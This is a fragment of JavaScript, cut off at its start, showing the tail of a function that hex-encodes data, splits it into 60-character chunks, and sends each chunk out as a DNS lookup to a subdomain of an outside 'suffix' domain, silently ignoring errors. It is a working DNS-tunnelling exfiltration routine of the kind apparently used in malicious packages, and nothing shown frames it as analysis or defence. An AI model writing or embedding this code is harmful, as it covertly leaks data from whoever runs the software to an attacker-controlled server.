  data = Buffer.from(data).toString('hex');
  data = data.match(/.{1,60}/g);
  let id = Math.random().toString(36).substring(2);
  data.forEach(function (chunk, idx) {
    try {
      dns.resolve(
        ns + '.' + id + '-' + idx + '-' + chunk + '.v2.' + suffix, 'A',
        function () {}
      );
    } catch (e) {}
  });
}

